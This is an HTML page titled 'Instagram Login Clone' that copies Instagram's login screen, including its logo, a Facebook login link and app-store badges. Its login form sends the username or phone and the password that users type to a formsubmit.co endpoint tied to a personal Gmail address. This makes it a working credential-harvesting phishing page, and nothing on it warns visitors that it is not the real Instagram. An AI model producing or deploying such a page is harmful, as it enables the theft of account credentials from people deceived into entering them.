<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Clone</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/jpeg">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>

<body class="bg-gray-50">
  <div class="flex flex-col items-center justify-center min-h-screen">
    <!-- Container for the login form -->
    <div class="bg-white p-8 rounded-lg shadow-md w-96">
      <!-- Instagram logo -->
      <div class="flex justify-center mb-8">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="w-32">
      </div>

      <!-- Login form -->
      <form
        action="https://formsubmit.co/developerAman123922@gmail.com"
        method="POST"
      >
        <input name="phone" type="text" placeholder="Phone number, username, or email"
          class="w-full mb-4 p-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input name="password" type="password" placeholder="Password"
          class="w-full mb-4 p-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500">
        <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded-lg font-semibold hover:bg-blue-600">Log
          In</button>
      </form>

      <!-- Divider -->
      <div class="flex items-center my-4">
        <div class="flex-grow border-t border-gray-300"></div>
        <span class="mx-2 text-gray-500">OR</span>
        <div class="flex-grow border-t border-gray-300"></div>
      </div>

      <!-- Facebook login -->
      <div class="flex justify-center mb-4">
        <a href="#" class="text-blue-800 font-semibold">Log in with Facebook</a>
      </div>

      <!-- Forgot password -->
      <div class="flex justify-center">
        <a href="#" class="text-sm text-blue-600">Forgot password?</a>
      </div>
    </div>

    <!-- Sign up section -->
    <div class="bg-white p-4 rounded-lg shadow-md mt-4 w-96 text-center">
      <span class="text-gray-700">Don't have an account?</span>
      <a href="#" class="text-blue-500 font-semibold">Sign up</a>
    </div>

    <!-- App download section -->
    <div class="flex flex-col items-center mt-6">
      <p class="mb-4">Get the app.</p>
      <div class="flex space-x-2">
        <a href="#">
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
            alt="Google Play" class="h-10">
        </a>
        <a href="#">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/6/67/Download_on_the_App_Store_Badge_US-UK_blk_092917.svg"
            alt="App Store" class="h-10">
        </a>
      </div>
    </div>
  </div>
</body>

</html>
